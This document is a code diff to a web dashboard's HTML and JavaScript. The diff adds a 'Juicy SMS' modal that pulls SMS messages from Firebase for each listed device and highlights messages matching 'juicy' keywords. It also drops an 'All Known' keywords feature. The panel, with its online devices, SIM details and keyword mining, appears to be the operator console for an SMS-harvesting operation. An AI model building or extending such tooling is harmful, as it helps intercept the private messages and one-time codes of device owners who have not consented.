@@ -449,7 +449,6 @@
     <div style="margin-top:10px;display:flex;gap:8px;align-items:center">
       <button class="btn" onclick="saveKeywords()">💾 Save</button>
       <button class="btn btn-ghost" onclick="closeKeywordsModal()">Cancel</button>
-      <button class="btn btn-ghost" id="kw-show-all-btn" onclick="loadAllKnownKeywords(this)" style="font-size:12px">📚 All Known</button>
       <span id="kw-count" style="color:var(--muted);font-size:12px;margin-left:auto"></span>
       <span id="kw-status" style="color:var(--green);font-size:12px"></span>
     </div>
@@ -866,6 +865,62 @@ function copyDeviceId(evt, deviceId, container) {
   });
 }
 
+// ── Juicy SMS Modal ───────────────────────────────────────────────────────────
+async function openJuicySms(evt, urlId, deviceId, brand) {
+  evt.stopPropagation();
+  const modal = document.getElementById('juicysms-modal');
+  const title = document.getElementById('juicysms-title');
+  const body  = document.getElementById('juicysms-body');
+
+  title.textContent = `🎯 Juicy SMS — ${brand} (${deviceId.slice(0,16)})`;
+  body.innerHTML = '<div class="loading"><div class="spinner"></div><br>Fetching SMS from Firebase…</div>';
+  modal.classList.add('open');
+
+  try {
+    const res  = await fetch(`/api/url/${urlId}/device/${encodeURIComponent(deviceId)}/juicy-sms?mode=${currentMode}`);
+    const data = await res.json();
+
+    if (data.error && !data.hits?.length) {
+      body.innerHTML = `<p style="color:var(--red)">Error: ${data.error}</p>`;
+      return;
+    }
+    if (!data.hits || !data.hits.length) {
+      body.innerHTML = '<p style="color:var(--muted)">📭 No juicy SMS found for this device.</p>';
+      return;
+    }
+
+    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    // Highlight all matched keywords in the message body
+    function highlight(text, keywords) {
+      let out = esc(text);
+      for (const kw of keywords) {
+        const re = new RegExp(`(${kw.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')})`, 'gi');
+        out = out.replace(re, '<mark style="background:rgba(245,158,11,.35);color:var(--yellow);border-radius:2px;padding:0 2px">$1</mark>');
+      }
+      return out;
+    }
+
+    body.innerHTML = `
+      <p style="color:var(--muted);font-size:12px;margin-bottom:12px">
+        Found <b style="color:var(--yellow)">${data.total}</b> message(s) containing juicy keywords
+        ${data.total >= 200 ? ' <span style="color:var(--yellow)">(capped at 200)</span>' : ''}
+      </p>
+      ${data.hits.map(h => `
+        <div class="hit-card" style="margin-bottom:8px">
+          <div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+            ${h.matchedKeywords.map(k => `<span class="kw-tag">${esc(k)}</span>`).join('')}
+          </div>
+          <div class="hit-body">${highlight(h.body, h.matchedKeywords)}</div>
+        </div>`).join('')}`;
+  } catch (e) {
+    body.innerHTML = `<p style="color:var(--red)">Error: ${e.message}</p>`;
+  }
+}
+
+function closeJuicySms() {
+  document.getElementById('juicysms-modal').classList.remove('open');
+}
+
 function renderDevices() {
   let list = currentDevices;
   if (activeFilter === 'online')  list = list.filter(d => d.status === 'online');
@@ -919,7 +974,12 @@ function renderDevices() {
     const sim2Html = simCell(d.sim2, d.sim2Clean, d.sim2Override, 'sim2', d.deviceId);
 
     const kwHtml = d.juicyKeywords.length
-      ? d.juicyKeywords.map(k => `<span class="kw-tag">${k}</span>`).join('')
+      ? `<div style="display:flex;align-items:flex-start;gap:4px;flex-wrap:wrap">
+           <div>${d.juicyKeywords.map(k => `<span class="kw-tag">${k}</span>`).join('')}</div>
+           <button class="sms-btn" style="margin-left:2px;white-space:nowrap;flex-shrink:0"
+                   title="View juicy SMS only"
+                   onclick="openJuicySms(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">💬</button>
+         </div>`
       : '—';
 
     // Brand cell: hidden if all unknown
@@ -1225,14 +1285,8 @@ async function openKeywordsModal() {
   try {
     const res = await fetch('/api/keywords');
     const data = await res.json();
-    // Show active keywords in editor
     document.getElementById('kw-textarea').value = data.keywords.join('\n');
-    const activeCount = data.keywords.length;
-    const allCount    = (data.all || data.keywords).length;
-    document.getElementById('kw-count').textContent =
-      allCount > activeCount
-        ? `${activeCount} active / ${allCount} total known`
-        : `${activeCount} keywords`;
+    document.getElementById('kw-count').textContent = `${data.keywords.length} keywords`;
   } catch (e) {
     document.getElementById('kw-textarea').value = '';
     document.getElementById('kw-status').textContent = `❌ Load error: ${e.message}`;
@@ -1254,27 +1308,8 @@ async function saveKeywords() {
     });
     const data = await res.json();
     if (data.ok) {
-      const newCount = data.newlyAdded?.length || 0;
-      const allCount = data.allCount || keywords.length;
-      document.getElementById('kw-count').textContent =
-        allCount > keywords.length
-          ? `${keywords.length} active / ${allCount} total known`
-          : `${keywords.length} keywords`;
-      if (newCount > 0) {
-        document.getElementById('kw-status').textContent =
-          `✅ Saved! ${newCount} new keyword(s) added — refreshing URLs…`;
-        // Close modal and refresh URL list after a short delay
-        setTimeout(() => {
-          document.getElementById('keywords-modal').classList.remove('open');
-          // If currently on URL list view, refresh it
-          if (document.getElementById('view-urls').classList.contains('active')) {
-            loadUrls();
-          }
-        }, 1500);
-      } else {
-        document.getElementById('kw-status').textContent = '✅ Saved!';
-        setTimeout(() => document.getElementById('kw-status').textContent = '', 2500);
-      }
+      document.getElementById('kw-status').textContent = '✅ Saved!';
+      setTimeout(() => document.getElementById('kw-status').textContent = '', 2500);
     }
   } catch (e) {
     document.getElementById('kw-status').textContent = `❌ ${e.message}`;
@@ -1286,21 +1321,6 @@ document.getElementById('kw-textarea')?.addEventListener('input', () => {
   const n = document.getElementById('kw-textarea').value.split('\n').filter(s=>s.trim()).length;
   document.getElementById('kw-count').textContent = `${n} keywords`;
 });
-
-// Load all ever-known keywords into the editor (for review / restore)
-async function loadAllKnownKeywords(btn) {
-  try {
-    const res  = await fetch('/api/keywords');
-    const data = await res.json();
-    const all  = data.all || data.keywords;
-    document.getElementById('kw-textarea').value = all.join('\n');
-    document.getElementById('kw-count').textContent = `${all.length} keywords (showing all known)`;
-    if (btn) btn.textContent = '✓ Showing all';
-    setTimeout(() => { if (btn) btn.textContent = '📚 All Known'; }, 2000);
-  } catch (e) {
-    document.getElementById('kw-status').textContent = `❌ ${e.message}`;
-  }
-}
 
 // ── SIM inline edit ───────────────────────────────────────────────────────────
 // localStorage key: simov_<mode>_<urlId>_<deviceId>_<slot>
@@ -2055,6 +2075,15 @@ if (typeof renderDevices === 'function') {
   };
 }
 </script>
+
+<!-- ── Juicy SMS Modal ── -->
+<div class="modal-overlay" id="juicysms-modal" onclick="if(event.target===this)closeJuicySms()">
+  <div class="modal-box" style="max-width:700px">
+    <button class="modal-close" onclick="closeJuicySms()">✕ Close</button>
+    <h3 id="juicysms-title">🎯 Juicy SMS</h3>
+    <div id="juicysms-body"><div class="loading"><div class="spinner"></div><br>Fetching SMS…</div></div>
+  </div>
+</div>
 
 <!-- ── Notification Toast ── -->
 <div id="notif-toast"></div>
